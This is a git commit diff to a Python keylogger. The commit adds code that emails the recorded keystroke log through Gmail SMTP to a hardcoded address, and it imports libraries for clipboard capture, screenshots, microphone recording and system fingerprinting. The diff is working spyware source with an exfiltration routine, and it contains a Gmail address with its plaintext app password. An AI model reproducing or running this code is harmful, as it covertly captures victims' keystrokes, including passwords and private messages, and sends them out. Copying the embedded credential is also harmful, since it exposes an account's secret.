fdd64a7ca25eefc1c9c05430eb965b3b73d2c801
casey <caseytran892@gmail.com>
2022-08-31 18:37:36 -0700

    adding email functionality

--- keylog.py
+++ keylog.py
@@ -1,40 +1,95 @@
 import pynput
 
 from pynput.keyboard import Key, Listener
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
 
+import socket
+import platform
 
+import win32clipboard
 
+import time
+import os
 
-def send_email(filename, attachment, toaddr):
-    pass
+from scipy.io.wavfile import write
+import sounddevice as sd
 
+from cryptography.fernet import Fernet
 
-# global variable declaration for keylog
+import getpass
+from requests import get
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+#variable declaration for email
+email_address = "keyclog@gmail.com"
+password = "zplhvxysqwztdygc"
+to_addr = "keyclog@gmail.com"
+
+# variable declaration for keylog
+key_log = "log.txt"
+file_path = "C:\\Users\\casey\\Documents\\comp sci\\keylogger" 
+extend = "\\"
+
+# variable declarations for keylog
 # count to check if key is pressed then written to, keys to hold the keys
 count = 0
 keys = []
 
+
+def send_email(filename, attachment, toaddr):
+    from_addr = email_address
+    msg = MIMEMultipart()
+    msg['From'] = from_addr
+    msg['To'] = to_addr
+    msg['Subject'] = "Logs"
+    body = "Body of Mail"
+    msg.attach(MIMEText(body, 'plain'))
+    filename = filename
+    attachment = open(attachment, 'rb')
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+    encoders.encode_base64(p)
+    p.add_header('Content-Disposition', "attachment; filename= %s" %filename)
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    # creating a secure session to send email
+    s.starttls()
+    s.login(from_addr, password)
+    text = msg.as_string()
+    s.sendmail(from_addr, to_addr, text)
+    # end the session
+    s.quit()
+
+send_email(key_log, file_path + extend + key_log, to_addr)
+ 
 def on_press(key):
     global keys, count
 
     keys.append(key)
     count += 1
     print("{0} pressed".format(key))
-    if count > 0:
+    if count >= 1:
         count = 0
         write_file(keys)
         keys = []
 
 def write_file(keys):
-    with open("log.txt", "a") as f:
+    with open("log.txt", "a") as file:
         for key in keys:
             # getting rid of ' from the string
             k = str(key).replace("'", "")
             # getting rid of spaces
             if k.find("space") > 0:
-                f.write('\n')
+                file.write('\n')
             elif k.find("Key") == -1:
-                f.write(k)
+                file.write(k)
 
 def on_release(key):
     if key == Key.esc:
